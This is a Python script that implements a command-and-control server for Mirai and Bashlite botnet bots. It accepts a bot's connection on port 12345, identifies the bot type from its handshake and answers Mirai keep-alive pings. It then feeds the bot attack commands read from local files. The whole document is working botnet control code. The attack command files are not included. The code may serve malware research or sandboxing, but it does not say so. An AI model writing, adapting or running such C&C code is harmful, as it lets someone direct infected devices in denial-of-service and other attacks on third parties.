import socket
import threading
import time


def send_bashlite(c):
    with open('./cmd_bashlite', 'r') as f:
        lines = f.readlines()
    for line in lines:
        try:
            cmd = line.encode()
            c.send(cmd)
            print('\033[91mC&C  | \033[00mSend: ', cmd)
            time.sleep(3)
        except Exception as e:
            print('\033[91mC&C  | \033[00mException: ' + str(e))
            break
        try:
            c.settimeout(1)
            data = c.recv(1024)
            if data != b'':
                print('\033[91mC&C  | \033[00mRecv: ', data)
        except:
            pass
    c.close()


def send_mirai(c):
    with open('./cmd_mirai', 'rb') as f:
        dat = f.read()[:-1]
    atk = list()
    for id in range(11):
        atk.append(dat[14*id:14*(id+1)])
    ping = b'\x00\x00'
    id = 0
    while True:
        data = b''
        try:
            c.settimeout(1)
            data = c.recv(1024)
            if data != b'':
                print('\033[91mC&C  | \033[00mRecv: ', data)
        except:
            pass
        if data == ping:
            try:
                c.send(ping)
                print('\033[91mC&C  | \033[00mSend: ', ping)
            except Exception as e:
                print('\033[91mC&C  | \033[00mException: ' + str(e))
                break
        elif data[:1] != '\x00':
            try:
                c.send(atk[id])
                print('\033[91mC&C  | \033[00mSend: ', atk[id])
                time.sleep(3)
                id += 1
                if id == len(atk):
                    break
            except Exception as e:
                print('\033[91mC&C  | \033[00mException: ' + str(e))
                break


def send(c):
    data = b''
    t = time.time()
    while data == b'' and time.time() - t <= 5:
        try:
            c.settimeout(5)
            data = c.recv(1024)
            print('\033[91mC&C  | \033[00mRecv: ', data)
        except:
            pass

    if data[:4] == b'\x00\x00\x00\x01':
        send_mirai(c)
    else:
        send_bashlite(c)
    c.close()


def server(host):
    port = 12345
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(5)

    print('\033[91mC&C  | \033[00mC&C Server is listening')

    while True:
        try:
            s.settimeout(30)
            c, addr = s.accept()
        except:
            print('\033[91mC&C  | \033[00mTimeout')
            return -1

        print('\033[91mC&C  | \033[00mConnected to ' +
              str(addr[0]) + ':' + str(addr[1]))
        # time.sleep(1)
        sendThread = threading.Thread(target=send, args=(c,))
        sendThread.start()
        sendThread.join()
        s.close()
        print('\033[91mC&C  | \033[00mServer closed')
        return 0


if __name__ == '__main__':
    server("")
